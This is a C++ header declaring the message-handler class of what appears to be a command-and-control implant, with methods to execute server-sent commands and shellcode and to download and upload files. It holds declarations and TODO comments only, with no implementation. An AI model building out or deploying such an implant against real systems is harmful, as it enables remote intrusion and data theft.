/* 
 * MessageHandler.h 
 *
 * Purpose: Responsible for handling internal messages (InternalMessage)
 *
 *
 *
 */

// TODO: rename to message parser? and only to message parsing in here? also add call backs to dispatcher

/*  (OWNS execution components) */

// TODO: rename class/file to CommandDispatcher?

#ifndef MESSAGE_HANDLER_H
#define MESSAGE_HANDLER_H

#include "C2Profile.h"
#include "MessageTypes.h"
#include "TransportLayer.h"

#include "Encoder.h"
#include "Serializer.h"

#include <string>
#include <vector>
#include <cstdint>
#include <functional>
// #include <memory> // included by C2Profile

class TransportLayer;

class MessageHandler
{
public:
	
	using ReceiveCallback = std::function<void(const InternalMessage&)>;
	void setOnMessage(ReceiveCallback cb) { receiveCallback_ = std::move(cb); }


	//MessageHandler(C2Profile& config) {}; // TODO:
	//MessageHandler() : transportLayer_(nullptr) {} // TODO: uncomment... should be still allowed to do client logic (like if messages are queued) even if we're disconnected from the server
	//MessageHandler(TransportLayer* transportLayer);
	MessageHandler(TransportLayer* transportLayer, Serializer* serializer, Encoder* encoder);

	~MessageHandler();

	void start();

	void handle(const RawByteBuffer& data); // TODO: change rawbytebuffer to const? 
	void handle(const InternalMessage& msg);
    
    bool sendMessage(); // overload this function?
    bool recvMessage(); // overload this function?

	//bool receiveMessages(uint8_t* buffer, size_t bytes_received);

	bool executeCommand(RawByteBuffer& data);
	//bool executeShellcode(RawByteBuffer& data);
	bool executeShellcode(InternalMessage& msg);

	bool downloadFile(RawByteBuffer& data);
	//bool executeFile();
	bool uploadFile(RawByteBuffer& data);
	bool updateConfig(RawByteBuffer& data);
	bool handleServerError(RawByteBuffer& data);
	//bool systemInfo(InternalMessage& msg); // TODO: uncomment when on windows



	// Processes an InternalMessage and use the messageHandler_ based on the InternalMessage's messageType
	void processMessage(InternalMessage& msg);


	// Iterate through all messages in the queue and send to the server
	void sendQueuedMessages();



	//bool handleTCP(uint8_t* rawData, size_t rawDataLength, InternalMessage* resultMsg);

	// TODO: make wrapper function/methods for these object's functions so i can define them as private vars instead of public? 
	Serializer* serializer_;
	Encoder* encoder_;
	//SerializerUniquePtr serializer_;
	//EncoderUniquePtr encoder_;
private:
	RawByteBuffer string2byte(std::string& inMsg);
	std::string byte2string(RawByteBuffer& inMsg);

	//C2Profile& config_;
	// Connections connection_ // MessageHandler should own/control socket/connections?

	//std::queue<InternalMessage> outgoing_queue;
	//std::mutex queue_mutex; // TODO: add thread logic too?

	// TODO: MessageHandler should have references to all transporters? 
	// std::vector<Transporter*> transporters_;
	TransportLayer* transportLayer_; // NOTE: pointer is being used instead of a reference because references require immediate initialization

	ReceiveCallback receiveCallback_;

	//SerializerUniquePtr serializer_;
	//EncoderUniquePtr encoder_;

};


typedef std::unique_ptr<MessageHandler> MessageHandlerPtr;

#endif
